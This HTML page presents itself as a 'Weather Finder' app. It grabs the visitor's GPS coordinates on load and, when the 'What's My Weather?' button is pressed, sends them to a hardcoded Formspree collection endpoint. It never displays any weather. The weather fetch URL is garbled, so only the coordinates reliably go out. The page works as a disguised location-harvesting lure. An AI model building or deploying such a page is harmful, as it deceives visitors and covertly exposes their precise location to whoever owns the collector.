<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Finder</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .app-container {
            background-color: #ffffff;
            padding: 35px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-top: 0;
            color: #333;
            font-size: 26px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-size: 14px;
            font-weight: 500;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
            background-color: #eee;
            cursor: not-allowed;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #ae1c21;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        button:hover {
            background-color: #8c1418;
        }
        .status-message {
            margin-top: 15px;
            font-size: 13px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="app-container">
    <h2>Weather Finder</h2>
    <p>Allow location access to auto-fill your parameters, then click below to check your weather.</p>
    
    <!-- Hardcoded POST form that Formspree can never reject -->
    <form action="https://formspree.io/f/mbdnlpkw" method="POST">
        
        <div class="form-group">
            <label>Your Latitude</label>
            <input type="text" id="latInput" name="Latitude" placeholder="Waiting for GPS..." readonly required>
        </div>

        <div class="form-group">
            <label>Your Longitude</label>
            <input type="text" id="lonInput" name="Longitude" placeholder="Waiting for GPS..." readonly required>
        </div>

        <div class="form-group">
            <label>Current Weather Status</label>
            <input type="text" id="weatherInput" name="Weather Summary" placeholder="Fetching sky conditions..." readonly required>
        </div>

        <button type="submit">What's My Weather?</button>
    </form>
    
    <div id="status" class="status-message">Requesting location permissions...</div>
</div>

<script>
    const weatherCodes = {
        0: 'Clear sky', 1: 'Mainly clear', 2: 'Partly cloudy', 3: 'Overcast',
        45: 'Fog', 48: 'Depositing rime fog',
        51: 'Light drizzle', 53: 'Moderate drizzle', 55: 'Dense drizzle',
        61: 'Slight rain', 63: 'Moderate rain', 65: 'Heavy rain',
        71: 'Slight snow fall', 73: 'Moderate snow fall', 75: 'Heavy snow fall',
        80: 'Slight rain showers', 81: 'Moderate rain showers', 82: 'Violent rain showers',
        95: 'Thunderstorm'
    };

    // Auto-run coordinates instantly when the user lands on the page
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(getRealWeather, handleGeoError);
    } else {
        document.getElementById('status').innerText = "Browser doesn't support geolocation.";
    }

    function handleGeoError(err) {
        document.getElementById('status').innerText = "Location permission denied.";
    }

    async function getRealWeather(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        
        document.getElementById('latInput').value = lat;
        document.getElementById('lonInput').value = lon;
        document.getElementById('status').innerText = "Location loaded. Reading sky code metrics...";

        try {
            const response = await fetch(`https://open-meteo.com{lat}&longitude=${lon}&current_weather=true`);
            const data = await response.json();
            
            if (data.current_weather) {
                const temp = `${data.current_weather.temperature}°C`;
                const summary = weatherCodes[data.current_weather.weathercode] || 'Clear';
                
                document.getElementById('weatherInput').value = `${summary} (${temp})`;
                document.getElementById('status').innerText = "Ready! Click the button to see your results.";
            }
        } catch (e) {
            document.getElementById('weatherInput').value = "Service offline (Sending coordinates only)";
            document.getElementById('status').innerText = "Weather API failed, but coordinates are ready.";
        }
    }
</script>

</body>
</html>
